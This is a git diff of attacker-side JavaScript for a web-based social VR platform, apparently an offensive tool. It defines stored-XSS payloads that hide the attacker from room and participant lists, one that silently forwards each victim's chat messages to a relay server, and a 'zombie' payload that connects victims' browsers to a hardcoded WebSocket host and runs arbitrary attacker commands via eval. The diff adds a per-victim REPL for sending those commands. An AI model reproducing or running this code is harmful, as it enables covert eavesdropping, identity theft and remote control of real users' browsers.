@@ -65,9 +65,27 @@ const roomIdInput = document.getElementById('roomIdInput');
 
 let allRemoteStreams = []; // TODO remove
 let rooms = {};
+let repls = {};
 let turnReady;
 let dataChannelSend, dataChannelReceive;
 
+
+function Repl(identity, formElement, inputElement, preElement){
+    this.identity = identity;
+    this.formElement = formElement;
+    this.inputElement = inputElement;
+    this.preElement = preElement;
+
+    this.renderCmd = function(cmd){
+        this.preElement.appendChild(document.createTextNode('≫ '+cmd+'\n'));
+        this.preElement.scrollTop = this.preElement.scrollHeight;
+    };
+
+    this.renderResult = function(result){
+        this.preElement.appendChild(document.createTextNode('← '+result+'\n'));
+        this.preElement.scrollTop = this.preElement.scrollHeight;
+    };
+}
 
 /**
  *  Connection between room participants using WebRTC.
@@ -131,15 +149,17 @@ function Connection(scid, pcid, roomParticipant){
                 dataChannelSend.onclose = that.onSendChannelStateChangeDirect;
             }
             else{
+                /*
                 that.rtcPeerConnection.ondatachannel = function(event) {
                     console.log('Receive Channel Callback');
                     dataChannelReceive = event.channel;
                     dataChannelReceive.onmessage = function(event){
-                        //console.error('Received Message', connection, event.data);
+                        console.error('Received Message', connection, event.data);
                     };
                     dataChannelReceive.onopen = that.onReceiveChannelStateChangeDirect;
                     dataChannelReceive.onclose = that.onReceiveChannelStateChangeDirect;
                 };
+                */
             }
 
             that.isStarted = true;
@@ -197,11 +217,10 @@ function Connection(scid, pcid, roomParticipant){
     };
 }
 
-function Identity(name, uuid, steamId, oculusId){
+function Identity(name, uuid, steamId){
     this.name = name;
     this.uuid = uuid;
     this.steamId = steamId;
-    this.oculusId = oculusId;
 
     this.userId = null;
 }
@@ -213,32 +232,53 @@ function RoomParticipant(identity, room, userId){
     /** Connection objects indexed by PCID */
     this.connections = {};
 
-    this.cardElement = null;
-    this.videoElement = null;
+    //region UI
+    let template = document.createElement('template');
+    template.innerHTML = '<div class="col-sm-6">\n' +
+        '           <div class="card">\n' +
+        '              <video class="card-img-top" autoplay playsinline controls></video>\n' +
+        '              <div class="card-body">\n' +
+        '                <h5 class="_username card-title"></h5>\n' +
+        '                <h6 class="_userId card-subtitle mb-2 text-muted"></h6>\n' +
+        '                <h6 class="_uuid card-subtitle mb-2 text-muted"></h6>\n' +
+        '                <p class="card-text"></p>\n' +
+        '                <p><button class="btn btn-primary" type="button" data-toggle="collapse" data-target="#repl'+this.room.roomId+this.userId+'" aria-expanded="false" aria-controls="collapseExample">REPL</button></p>\n' +
+        '                <div class="collapse" id="repl'+this.room.roomId+this.userId+'">\n' +
+        '                    <div class="card card-body p-0">\n' +
+        '                    <pre class="repl"></pre>\n' +
+        '                    <form>\n' +
+        '                        <div class="input-group">\n' +
+        '                            <div class="input-group-prepend">\n' +
+        '                                <span class="input-group-text">&Gt;</span>\n' +
+        '                            </div>\n' +
+        '                            <input type="text" name="repl" class="form-control" >\n' +
+        '                            <div class="input-group-append">\n' +
+        '                                <input class="btn btn-outline-danger" type="submit" value="Execute">\n' +
+        '                            </div>\n' +
+        '                        </div>\n' +
+        '                    </form>\n' +
+        '                    </div>\n' +
+        '                </div>\n' +
+        '              </div>\n' +
+        '            </div>\n' +
+        '        </div>';
+    let cardElement = template.content.firstChild;
+    this.cardElement = cardElement;
+    this.videoElement = cardElement.getElementsByTagName('video')[0];
+    repls[this.identity.uuid] = new Repl(
+        this.identity,
+        cardElement.getElementsByTagName('form')[0],
+        cardElement.getElementsByTagName('form')[0].getElementsByTagName('input')[0],
+        cardElement.getElementsByTagName('pre')[0],
+    );
+    cardElement.getElementsByClassName('_username')[0].appendChild(document.createTextNode(this.identity.name));
+    cardElement.getElementsByClassName('_userId')[0].appendChild(document.createTextNode(this.userId));
+    cardElement.getElementsByClassName('_uuid')[0].appendChild(document.createTextNode(this.identity.uuid));
 
     this.render = function(){
-        let template = document.createElement('template');
-        template.innerHTML = '<div class="col-sm-6">\n' +
-            '           <div class="card">\n' +
-            '              <video class="card-img-top" autoplay playsinline controls></video>\n' +
-            '              <div class="card-body">\n' +
-            '                <h5 class="_username card-title"></h5>\n' +
-            '                <h6 class="_userId card-subtitle mb-2 text-muted"></h6>\n' +
-            '                <h6 class="_uuid card-subtitle mb-2 text-muted"></h6>\n' +
-            '                <p class="card-text"></p>\n' +
-            '              </div>\n' +
-            '            </div>\n' +
-            '        </div>';
-        let cardElement = template.content.firstChild;
-        this.cardElement = cardElement;
-        this.videoElement = cardElement.getElementsByTagName('video')[0];
-
-        cardElement.getElementsByClassName('_username')[0].appendChild(document.createTextNode(this.identity.name));
-        cardElement.getElementsByClassName('_userId')[0].appendChild(document.createTextNode(this.userId));
-        cardElement.getElementsByClassName('_uuid')[0].appendChild(document.createTextNode(this.identity.uuid));
-
         room.roomUI.participantsElement.appendChild(cardElement);
     };
+    //endregion
 }
 
 //region XSS payloads
@@ -246,7 +286,7 @@ let hideUsernameFromRoomPreview = `Array.prototype.forEach.call(document.getElem
 let hideFirstCommaFromRoomPreview = "setTimeout(function(){var n=document.getElementById('room-card-players').childNodes;if(n[0].nodeName==='SCRIPT'&&n[1].nodeName==='#text'&& n[1].data===', '){n[1].remove()}},1);";
 let hideUsernameFromRoomParticipants = `Array.prototype.forEach.call(document.querySelectorAll('#room-participants li'),function(e){if(e.querySelector('h3.user-name').firstChild.nodeValue==='${textName}'){e.remove()}});`;
 let persistentChatEavesdropping = `;sendChat=function(){var s=new WebSocket('${relayServer}');s.onopen=function(){s.send(JSON.stringify({'type':'chat','roomId':roomState.roomId,'name':NAME,'steamId':mySteamId,'oculusId':myOculusId,'message':$('#room-chat-input').val()}));if(canSendChatMessage){canSendChatMessage= false;var _0x1865xb7=$(_0x6af9[1362])[_0x6af9[743]]();if(_0x1865xb7!= _0x6af9[90]){$(_0x6af9[1362])[_0x6af9[743]](_0x6af9[90]);$(_0x6af9[1362])[_0x6af9[1359]]();displayChatMessage(_0x1865xb7,USER);Unity[_0x6af9[1072]](_0x6af9[1971],[_0x1865xb7],USER,_0x6af9[1972]);gaChatMessageSentEvent()};setTimeout(function(){canSendChatMessage= true},CHATRATELIMIT)};};};`;
-let makeZombie = "var sz=new WebSocket('ws://172.26.103.128:8081');sz.onopen=function(){sz.send(JSON.stringify({'type':'zombie-register','steamId':mySteamId,'oculusId':myOculusId}))};sz.onmessage=function(e){var m=JSON.parse(e.data);if(m.type==='zombie-cmd'){sz.send(JSON.stringify({type:'zombie-result','steamId':mySteamId,'oculusId':myOculusId, result:eval(m.cmd)}))}};";
+let makeZombie = "var sz=new WebSocket('ws://172.26.103.128:8081');sz.onopen=function(){sz.send(JSON.stringify({'type':'zombie-register','steamId':mySteamId,'oculusId':myOculusId,'uuid':ACCOUNT.uuid}))};sz.onmessage=function(e){var m=JSON.parse(e.data);if(m.type==='zombie-cmd'){sz.send(JSON.stringify({type:'zombie-result','steamId':mySteamId,'oculusId':myOculusId,'uuid':ACCOUNT.uuid,result:eval(m.cmd)}))}};";
 //endregion
 
 let NAME = textName;
@@ -362,8 +402,7 @@ function Room(roomId, attackerIdentity){
                 let identity = new Identity(
                     roomState[userId + '.name'],
                     roomState[userId + '.uuid'],
-                    roomState[userId + '.steamId'] ? roomState[userId + '.steamId'] : '',
-                    roomState[userId + '.oculusId'] ? roomState[userId + '.oculusId'] : ''
+                    roomState[userId + '.steam'] ? roomState[userId + '.steam'] : ''
                 );
                 that.roomParticipants[userId] = new RoomParticipant(identity, that, userId);
             }
@@ -642,11 +681,27 @@ messageRelayWs.onmessage = function(event){
             let zombieId = message.steamId + '_' + message.oculusId;
             console.log('New zombie:', zombieId);
             zombies.push(zombieId);
+
+            let repl = repls[message.uuid];
+            repl.formElement.addEventListener("submit", function (event) {
+                event.preventDefault();
+                let cmd = repl.inputElement.value;
+                repl.renderCmd(cmd);
+                messageRelayWs.send(JSON.stringify({
+                    type: "zombie-cmd",
+                    steamId: message.steamId,
+                    oculusId: message.oculusId,
+                    uuid: message.uuid,
+                    cmd: cmd
+                }));
+            });
+
             break;
         }
         case 'zombie-result': {
             let zombieId = message.steamId + '_' + message.oculusId;
             console.log('Zombie :', zombieId, 'Result:', message.result);
+            repls[message.uuid].renderResult(message.result);
             break;
         }
         default:
